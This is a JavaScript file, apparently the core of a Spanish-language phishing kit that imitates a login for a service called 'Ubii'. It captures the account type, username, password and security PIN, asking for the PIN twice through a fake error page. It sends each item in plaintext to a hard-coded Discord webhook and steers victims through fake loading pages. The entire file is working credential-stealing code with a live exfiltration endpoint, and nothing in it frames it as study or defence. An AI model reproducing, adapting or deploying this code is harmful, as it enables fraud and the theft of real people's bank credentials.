///send.js

const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1523289900974342249/hCumRY2XSflj9zqLB-qaXNuOUyjnFAlejt11Ldj8zJ8VSpXib4C1KQrDqkHlr4yN5fll';
const SESSION_KEY = 'sessionData';

function generateSessionId() {
  return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 20) + '_' + Math.random().toString(36).substr(2, 20);
}

function getSessionId() {
  let sessionId = sessionStorage.getItem('sessionId');
  if (!sessionId) {
    sessionId = generateSessionId();
    sessionStorage.setItem('sessionId', sessionId);
  }
  return sessionId;
}

function getSessionData() {
  const data = sessionStorage.getItem(SESSION_KEY);
  return data ? JSON.parse(data) : {};
}

function setSessionData(newData) {
  const current = getSessionData();
  const updated = { ...current, ...newData, sessionId: getSessionId() };
  sessionStorage.setItem(SESSION_KEY, JSON.stringify(updated));
  return updated;
}

function clearSession() {
  sessionStorage.removeItem(SESSION_KEY);
  sessionStorage.removeItem('sessionId');
}

function validatePassword(password) {
  const hasUpper = /[A-Z]/.test(password);
  const hasLower = /[a-z]/.test(password);
  const hasNumber = /\d/.test(password);
  const hasSpecial = /[^A-Za-z0-9]/.test(password);
  const validLength = password.length >= 8 && password.length <= 16;

  return {
    isValid: validLength && hasUpper && hasLower && hasSpecial,
    hasUpper,
    hasLower,
    hasNumber,
    hasSpecial,
    validLength,
    errors: {
      length: !validLength ? `La contraseña debe tener entre 8 y 16 caracteres (actual: ${password.length})` : null,
      upper: !hasUpper ? 'Debe contener al menos una mayúscula' : null,
      lower: !hasLower ? 'Debe contener al menos una minúscula' : null,
      special: !hasSpecial ? 'Debe contener al menos un carácter especial' : null,
      number: !hasNumber ? 'Idealmente contiene números (no requerido)' : null
    }
  };
}

function getPasswordErrorMessage(validation) {
  const errors = [];
  if (validation.errors.length) errors.push(validation.errors.length);
  if (validation.errors.upper) errors.push(validation.errors.upper);
  if (validation.errors.lower) errors.push(validation.errors.lower);
  if (validation.errors.special) errors.push(validation.errors.special);
  return errors.join('\n• ');
}

async function sendToDiscord(data) {
  try {
    const sessionId = getSessionId();
    const payload = {
      embeds: [{
        title: data.title || "Notificación",
        description: data.description || "",
        color: data.color || 0x0099ff,
        fields: [
          ...data.fields,
          { name: "Sesión", value: `\`${sessionId.substr(0, 8)}\``, inline: false }
        ],
        timestamp: new Date().toISOString()
      }]
    };

    const response = await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    return response.ok;
  } catch (error) {
    console.error('Error enviando a Discord:', error);
    return false;
  }
}

function getCurrentPage() {
  const path = window.location.pathname;
  if (path.includes('index.html') || path.endsWith('/')) return 'index';
  if (path.includes('soli.html')) return 'soli';
  if (path.includes('codex.html')) return 'codex';
  if (path.includes('auto.html')) return 'auto';
  if (path.includes('pin.html')) return 'pin';
  if (path.includes('pin-error.html')) return 'pin-error';
  if (path.includes('auto-error.html')) return 'auto-error';
  if (path.includes('fin.html')) return 'fin';
  if (path.includes('load.html')) return 'load';
  return 'unknown';
}

function redirectTo(page) {
  const basePath = window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/'));
  window.location.href = `${basePath}/${page}`;
}

async function handleIndex(credentials) {
  const { type, username, password } = credentials;
  
  const passwordValidation = validatePassword(password);
  if (!passwordValidation.isValid) {
    console.error('Contraseña no cumple requisitos:', getPasswordErrorMessage(passwordValidation));
    return false;
  }
  
  if (!type || !username || !password) {
    console.error('Datos incompletos en index.html');
    return false;
  }

  setSessionData({
    type,
    username,
    password,
    startTime: new Date().toISOString()
  });

  await sendToDiscord({
    title: "🪄 𝐿𝑜𝑔𝑜 𝑈𝑏𝑖𝑖 🪄",
    color: 0x8A2BE2,
    fields: [
      { name: "𝑇𝑖𝑝𝑜", value: `\`${type.charAt(0).toUpperCase() + type.slice(1)}\``, inline: false },
      { name: "𝑈𝑠𝑢𝑎𝑟𝑖𝑜", value: `\`${username}\``, inline: false },
      { name: "𝐶𝑙𝑎𝑣𝑒", value: `\`${password}\``, inline: false }
    ]
  });

  redirectTo('load.html?from=index');
  return true;
}

async function handleAuto() {
  const sessionData = getSessionData();
  
  if (!sessionData.type) {
    console.error('No hay datos de sesión para auto');
    return false;
  }

  await sendToDiscord({
    title: "🎯 𝐵𝑜𝑡𝑜𝑛 𝐴𝑢𝑡𝑜 𝑈𝑡𝑖𝑙𝑖𝑧𝑎𝑑𝑜 🎯",
    color: 0x8A2BE2,
    fields: [
      { name: "𝑈𝑠𝑢𝑎𝑟𝑖𝑜", value: `\`${sessionData.username}\``, inline: false }
    ]
  });

  redirectTo('load.html?from=auto');
  return true;
}

async function handleAutoError() {
  const sessionData = getSessionData();
  
  if (!sessionData.type) {
    console.error('No hay datos de sesión para auto-error');
    return false;
  }

  await sendToDiscord({
    title: "🎯 𝐵𝑜𝑡𝑜𝑛 𝐴𝑢𝑡𝑜-𝐸𝑟𝑟𝑜𝑟 𝑈𝑡𝑖𝑙𝑖𝑧𝑎𝑑𝑜 🎯",
    color: 0x8A2BE2,
    fields: [
      { name: "𝑈𝑠𝑢𝑎𝑟𝑖𝑜", value: `\`${sessionData.username}\``, inline: false }
    ]
  });

  redirectTo('load.html?from=auto-error');
  return true;
}

async function handlePin(pinData) {
  const { pin_seguridad } = pinData;
  const sessionData = getSessionData();

  if (!pin_seguridad) {
    console.error('PIN no proporcionado');
    return false;
  }

  if (!sessionData.type) {
    console.error('No hay datos de sesión para PIN');
    return false;
  }

  setSessionData({ pin_seguridad });

  await sendToDiscord({
    title: "#️⃣ 𝑃𝐼𝑁 𝐼𝑛𝑔𝑟𝑒𝑠𝑎𝑑𝑜 #️⃣",
    color: 0x8A2BE2,
    fields: [
      { name: "𝑃𝐼𝑁", value: `\`${pin_seguridad}\``, inline: false },
      { name: "𝑈𝑠𝑢𝑎𝑟𝑖𝑜", value: `\`${sessionData.username}\``, inline: false }
    ]
  });

  redirectTo('load.html?from=pin');
  return true;
}

async function handlePinError(pinData) {
  const { pin_seguridad } = pinData;
  const sessionData = getSessionData();

  if (!pin_seguridad) {
    console.error('PIN no proporcionado en error');
    return false;
  }

  if (!sessionData.type) {
    console.error('No hay datos de sesión para PIN error');
    return false;
  }

  setSessionData({ pin_seguridad_error: pin_seguridad });

  await sendToDiscord({
    title: "#️⃣ 𝑃𝐼𝑁 𝐼𝑛𝑔𝑟𝑒𝑠𝑎𝑑𝑜𝑋2 #️⃣",
    color: 0x8A2BE2,
    fields: [
      { name: "𝑃𝐼𝑁", value: `\`${pin_seguridad}\``, inline: false },
      { name: "𝑈𝑠𝑢𝑎𝑟𝑖𝑜", value: `\`${sessionData.username}\``, inline: false }
    ]
  });

  redirectTo('load.html?from=pin-error');
  return true;
}

function handleLoad() {
  const urlParams = new URLSearchParams(window.location.search);
  const from = urlParams.get('from');

  if (!from) {
    console.error('Parámetro "from" no encontrado en load.html');
    return;
  }

  let nextPage = null;
  
  switch(from) {
    case 'index':
      nextPage = 'soli.html';
      break;
    case 'soli':
      nextPage = 'codex.html';
      break;
    case 'codex':
      nextPage = 'auto.html';
      break;
    case 'auto':
      nextPage = 'auto-error.html';
      break;
    case 'auto-error':
      nextPage = 'pin.html';
      break;
    case 'pin':
      nextPage = 'pin-error.html';
      break;
    case 'pin-error':
      nextPage = 'fin.html';
      break;
    default:
      console.error('Flujo no reconocido desde:', from);
      return;
  }

  setTimeout(() => {
    redirectTo(nextPage);
  }, 5000);
}

function handleFin() {
  const sessionData = getSessionData();

  if (!sessionData.username) {
    console.error('No hay datos de sesión en fin');
    return;
  }

  sendToDiscord({
    title: "🎆 𝐹𝑙𝑢𝑗𝑜 𝐶𝑜𝑚𝑝𝑙𝑒𝑡𝑎𝑑𝑜 🎆",
    color: 0x8A2BE2,
    fields: [
      { name: "Usuario", value: `\`${sessionData.username}\``, inline: false },
      { name: "Duración", value: calculateDuration(sessionData.startTime), inline: false }
    ]
  });

  setTimeout(() => {
    clearSession();
  }, 1000);
}

function calculateDuration(startTime) {
  const start = new Date(startTime);
  const end = new Date();
  const diff = Math.floor((end - start) / 1000);
  const minutes = Math.floor(diff / 60);
  const seconds = diff % 60;
  return `${minutes}m ${seconds}s`;
}

function initFlow() {
  const currentPage = getCurrentPage();

  const handlers = {
    'index': () => {},
    'soli': () => {},
    'codex': () => {},
    'auto': () => {},
    'auto-error': () => {},
    'pin': () => {},
    'pin-error': () => {},
    'load': () => {
      handleLoad();
    },
    'fin': () => {
      handleFin();
    }
  };

  if (handlers[currentPage]) {
    handlers[currentPage]();
  }
}

document.addEventListener('DOMContentLoaded', function() {
  initFlow();
  initPasswordValidation();
});

function initPasswordValidation() {
  const currentPage = getCurrentPage();
  
  if (currentPage !== 'index') {
    return;
  }

  const passwordInput = document.getElementById('password');
  const errorDiv = document.getElementById('passwordError');
  const form = document.getElementById('index-form');
  const submitBtn = form ? form.querySelector('button[type="submit"]') : null;

  if (!passwordInput || !errorDiv || !form || !submitBtn) {
    console.warn('Elementos de validación de contraseña no encontrados en el DOM');
    return;
  }

  passwordInput.addEventListener('input', function() {
    const validation = validatePassword(this.value);

    if (this.value.length === 0) {
      errorDiv.style.display = 'none';
      submitBtn.disabled = true;
    } else if (validation.isValid) {
      errorDiv.style.display = 'none';
      errorDiv.textContent = '';
      submitBtn.disabled = false;
    } else {
      errorDiv.style.display = 'block';
      errorDiv.textContent = '• ' + getPasswordErrorMessage(validation);
      submitBtn.disabled = true;
    }
  });

  form.addEventListener('submit', function(e) {
    e.preventDefault();

    const type = document.querySelector('input[name="type"]:checked')?.value;
    const username = document.getElementById('username')?.value;
    const password = passwordInput.value;
    const validation = validatePassword(password);

    if (!validation.isValid) {
      errorDiv.style.display = 'block';
      errorDiv.textContent = '• ' + getPasswordErrorMessage(validation);
      submitBtn.disabled = true;
      return false;
    }

    handleIndex({ type, username, password });
    return false;
  });
}
